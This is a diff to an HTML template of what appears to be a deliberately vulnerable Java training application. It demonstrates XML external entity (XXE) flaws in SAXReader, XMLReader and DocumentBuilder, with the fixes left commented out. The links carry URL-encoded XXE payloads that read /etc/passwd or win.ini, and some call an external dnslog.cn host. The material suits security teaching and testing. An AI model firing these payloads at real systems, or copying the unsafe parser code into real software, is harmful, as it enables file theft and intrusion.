@@ -48,6 +48,21 @@
             <div class="box-float">
                 <div class="float1">
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/XXE/SAXReader?content=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE%20data%20%5B%0A%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini%22%0A%3E%5D%3E%0A%3Cdata%3E%0A%26xxe%3B%0A%3C%2Fdata%3E%0A}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - SAXReader</span></h5>
+                    <textarea class="form-control" id="code2">
+SAXReader sax = new SAXReader();
+// 修复：禁用外部实体
+// sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+sax.read(new InputSource(new StringReader(content)));
+                    </textarea><label for="code2"> </label> <br><br>
+
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
                        th:href="@{/XXE/XMLReader?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%36%31%67%6b%62%38%2e%64%6e%73%6c%6f%67%2e%63%6e%22%3e%5d%3e%3c%72%6f%6f%74%3e%26%78%78%65%3b%3c%2f%72%6f%6f%74%3e}">
                         <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
                              viewBox="0 0 16 16">
@@ -68,21 +83,6 @@ public String XMLReader(@RequestBody String content) {
     }
 }
                     </textarea><br><br>
-
-                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       th:href="@{/XXE/SAXReader?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%30%67%35%7a%76%64%2e%64%6e%73%6c%6f%67%2e%63%6e%22%3e%5d%3e%3c%72%6f%6f%74%3e%26%78%78%65%3b%3c%2f%72%6f%6f%74%3e}">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
-                             viewBox="0 0 16 16">
-                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
-                        </svg>
-                        <span class="align-middle"> Run</span></a>
-                    <h5><span class="lnr lnr-bug"> 漏洞代码 - SAXReader</span></h5>
-                    <textarea class="form-control" id="code2">
-SAXReader sax = new SAXReader();
-// 修复：禁用外部实体
-// sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-sax.read(new InputSource(new StringReader(content)));
-                    </textarea><label for="code2"> </label> <br><br>
 
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
                        th:href="@{/XXE/SAXBuilder}">
@@ -110,7 +110,7 @@ public String SAXBuilder(@RequestBody String content) {
 
                 <div class="float2">
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       th:href="@{/XXE/DocumentBuilder?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%3e%5d%3e%3c%70%65%72%73%6f%6e%3e%3c%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6e%61%6d%65%3e%3c%2f%70%65%72%73%6f%6e%3e}">
+                       th:href="@{/XXE/DocumentBuilder?content=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini%22%3E%5D%3E%3Cperson%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fperson%3E}">
                         <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
@@ -122,6 +122,9 @@ DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
 // 修复: 禁用外部实体
 // factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 DocumentBuilder builder = factory.newDocumentBuilder();
+StringReader sr = new StringReader(content);
+InputSource is = new InputSource(sr);
+builder.parse(is);
                     </textarea><br><br>
 
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
